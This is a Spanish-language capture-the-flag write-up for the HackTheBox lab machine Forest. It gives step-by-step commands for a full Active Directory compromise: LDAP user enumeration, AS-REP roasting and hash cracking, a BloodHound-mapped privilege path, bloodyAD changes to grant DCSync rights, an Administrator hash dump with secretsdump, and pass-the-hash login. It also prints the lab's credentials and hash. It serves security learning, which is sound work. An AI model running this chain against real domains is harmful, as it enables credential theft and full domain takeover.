# HackTheBox - Forest

## Task 1
**Reconocimiento inicial - escaneo de puertos y descubrimiento del dominio**

Empezamos con un escaneo completo de puertos para identificar los servicios expuestos por el objetivo.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.95.210
```

![Escaneo completo de nmap](images/task1-nmap-full-scan.png)

El resultado muestra los puertos típicos de un controlador de dominio Active Directory: **Kerberos (88)**, **LDAP (389/636/3268/3269)**, **SMB (445)**, **WinRM (5985)**, entre otros. Esto confirma que el objetivo es un Domain Controller.

A continuación usamos `netexec` (antes CrackMapExec) para obtener información básica del dominio sin autenticarnos:

```bash
netexec smb 10.129.95.210
```

![netexec - descubrimiento del dominio](images/task1-netexec.png)

La salida nos confirma el nombre del dominio (**htb.local**), el nombre de host (**FOREST**) y detalles como que la firma SMB está activa.

También confirmamos el nombre del dominio vía LDAP:

```bash
nmap -p389 --script ldap-rootdse 10.129.95.210
```

![nmap ldap-rootdse - nombre del dominio](images/task1-nmap-domain.png)

Con esto confirmamos el `namingContext` (`DC=htb,DC=local`) y el nombre del controlador de dominio (`FOREST`).

---

## Task 2
**Enumeración de usuarios del dominio**

Probamos primero acceso anónimo por SMB:

```bash
smbclient -L //10.129.95.210 -N
```

![smbclient anónimo](images/task2-smbclient-anon.png)

El login anónimo tiene éxito pero no se listan shares útiles directamente por este medio.

Pasamos a enumerar usuarios del dominio vía LDAP anónimo:

```bash
ldapsearch -x -H ldap://10.129.95.210 \
-b "DC=htb,DC=local" \
"(objectClass=user)" sAMAccountName | grep "^sAMAccountName:" | cut -d " " -f2
```

![Enumeración LDAP de usuarios](images/task2-ldap-enum-users.png)

Esto nos devuelve una lista completa de usuarios del dominio, incluyendo cuentas de servicio (`HealthMailbox*`, cuentas `SM_*`) y usuarios "reales": `sebastien`, `lucinda`, `andy`, `mark`, `santi`.

Filtrando el ruido, confirmamos también la presencia de la cuenta de servicio **svc-alfresco**:

![svc-alfresco en la enumeración LDAP](images/task2-ldap-enum-alfresco.png)

Con los usuarios "reales" identificados, creamos un archivo de texto para usarlo como lista de usuarios en los siguientes ataques:

![Creando la lista de usuarios](images/task2-creating-userlist.png)

```text
sebastien
lucinda
andy
mark
santi
Administrator
Guest
```

![user.txt final](images/task2-userlist-final.png)

---

## Task 3
**AS-REP Roasting - obtención de credenciales de svc-alfresco**

Con la lista de usuarios preparada, buscamos cuentas que tengan deshabilitado el requisito de pre-autenticación Kerberos (`UF_DONT_REQUIRE_PREAUTH`), lo que las hace vulnerables a **AS-REP Roasting**:

```bash
impacket-GetNPUsers htb.local/ -usersfile user.txt -dc-ip 10.129.95.210
```

![AS-REP Roasting - hash de svc-alfresco](images/task3-asrep-hash-alfresco.png)

La mayoría de usuarios no son vulnerables, pero **svc-alfresco** sí lo es, y obtenemos su hash `$krb5asrep$23$svc-alfresco@HTB.LOCAL...`.

Guardamos el hash y lo crackeamos offline con Hashcat:

```bash
hashcat -m 18200 asrep-hash.txt rockyou.txt
```

Como resultado obtenemos la contraseña en texto plano de **svc-alfresco**: `s3rvice`.

---

## Task 4
**Verificación de acceso con las credenciales obtenidas**

Con las credenciales `svc-alfresco:s3rvice`, confirmamos que el usuario tiene acceso remoto vía WinRM:

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
```

![Acceso WinRM como svc-alfresco](images/task5-evilwinrm-alfresco.png)

Esto nos da una shell interactiva en la máquina como `svc-alfresco`, confirmando el punto de entrada al dominio.

---

## Task 5
**Recolección de datos con BloodHound**

Para mapear las relaciones de privilegios del dominio, usamos `bloodhound-python` con las credenciales de `svc-alfresco`:

```bash
bloodhound-python \
-u svc-alfresco \
-p 's3rvice' \
-d htb.local \
-c All \
-ns 10.129.95.210 \
--zip
```

![Recolección de datos con BloodHound](images/task6-bloodhound-ingest.png)

Esto genera un `.zip` con toda la información del dominio (usuarios, grupos, computadoras, ACLs, sesiones, etc.), listo para subir a BloodHound CE vía **File Ingest**.

---

## Task 6
**Análisis en BloodHound - camino de escalada de privilegios**

Al analizar los grupos de los que `svc-alfresco` es miembro (directa e indirectamente), encontramos la siguiente cadena:

![Cadena de grupos de svc-alfresco](images/task6-grupos-alfresco.png)

`svc-alfresco` → `Service Accounts` → `Privileged IT Accounts` → **`Account Operators`**

**Account Operators** es un grupo privilegiado de Active Directory cuyos miembros pueden crear y modificar usuarios, y añadirlos a grupos no protegidos (sin `adminCount=1`).

### Which group has WriteDACL permissions over the HTB.LOCAL domain?

Visualizando el nodo del dominio `HTB.LOCAL` y sus "Inbound Object Control", vemos varias relaciones de control:

![Grafo completo de controladores sobre HTB.LOCAL](images/task6-htb-local-graph.png)

Analizando cada relación específica, confirmamos que el grupo **Exchange Windows Permissions** tiene una relación **WriteDacl** directa (no heredada) sobre el objeto dominio:

![WriteDacl de Exchange Windows Permissions sobre HTB.LOCAL](images/task6-writedacl-exchange.png)

**Respuesta: `EXCHANGE WINDOWS PERMISSIONS`**

### Which group allows svc-alfresco to add itself to "Exchange Windows Permissions"?

Como `svc-alfresco` es miembro de **Account Operators**, y este grupo puede modificar la membresía de grupos no protegidos, puede añadirse a sí mismo a `Exchange Windows Permissions` (que no está protegido por AdminSDHolder).

**Respuesta: `ACCOUNT OPERATORS`**

### ¿Qué ataque permite escalar privilegios con WriteDACL sobre el dominio?

Con `WriteDacl` sobre el objeto dominio se puede modificar su ACL para otorgarse los derechos extendidos de replicación (`DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All`), lo que permite ejecutar un ataque **DCSync**.

**Respuesta: `DCSync`**

---

## Task Final
**Explotación - de svc-alfresco a Domain Admin**

### Paso 1 - Añadir a svc-alfresco al grupo Exchange Windows Permissions

Verificamos primero el estado inicial del grupo:

```bash
net rpc group members "Exchange Windows Permissions" -U htb.local/svc-alfresco%'s3rvice' -S 10.129.95.210
```

![Estado inicial del grupo](images/taskfinal-check-group-before.png)

Solo aparece `Exchange Trusted Subsystem` como miembro. Usamos `bloodyAD`, apoyándonos en los privilegios de `Account Operators`, para añadir a `svc-alfresco`:

```bash
bloodyAD --host 10.129.95.210 -d htb.local -u svc-alfresco -p 's3rvice' \
add groupMember "Exchange Windows Permissions" svc-alfresco
```

Verificamos de nuevo que el cambio se aplicó correctamente:

![Usuario añadido y verificado en el grupo](images/taskfinal-add-group-verified.png)

### Paso 2 - Otorgarse derechos de DCSync

Con `svc-alfresco` ya dentro de `Exchange Windows Permissions` (que tiene WriteDacl sobre el dominio), modificamos la ACL del dominio para concedernos los derechos de replicación:

```bash
bloodyAD --host 10.129.95.210 -d htb.local -u svc-alfresco -p 's3rvice' \
add dcsync svc-alfresco
```

![Derechos de DCSync concedidos](images/taskfinal-dcsync-grant.png)

### Paso 3 - Ejecutar el ataque DCSync

Con los derechos de replicación concedidos, usamos `secretsdump.py` de Impacket para volcar el hash NTLM del Administrator:

```bash
impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.129.95.210 -just-dc-user Administrator
```

![Hash del Administrator obtenido vía DCSync](images/taskfinal-secretsdump-hash.png)

Obtenemos el hash NTLM del Administrador del dominio:

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Paso 4 - Pass-the-Hash y captura de la flag

Con el hash NTLM, iniciamos sesión directamente como Administrator sin necesitar la contraseña en texto plano:

```bash
evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

![Acceso como Administrator y root.txt](images/taskfinal-root-flag.png)

Con control total del Domain Controller, navegamos hasta el escritorio del Administrator y leemos la flag final:

```powershell
cat ../Desktop/root.txt
```

**Máquina Forest completada.**

---

## Resumen del camino de ataque

1. Enumeración de usuarios del dominio vía LDAP anónimo.
2. AS-REP Roasting → contraseña en texto plano de `svc-alfresco` (`s3rvice`).
3. Recolección de datos de BloodHound con las credenciales de `svc-alfresco`.
4. Identificación de la cadena: `svc-alfresco` → `Account Operators` → puede modificar `Exchange Windows Permissions` → este grupo tiene `WriteDacl` sobre el dominio.
5. Auto-inclusión en `Exchange Windows Permissions` con `bloodyAD`.
6. Concesión de derechos de DCSync sobre el dominio con `bloodyAD`.
7. Ejecución de DCSync con `secretsdump.py` → hash NTLM del Administrator.
8. Pass-the-Hash con `evil-winrm` → shell como Administrator → root.txt.
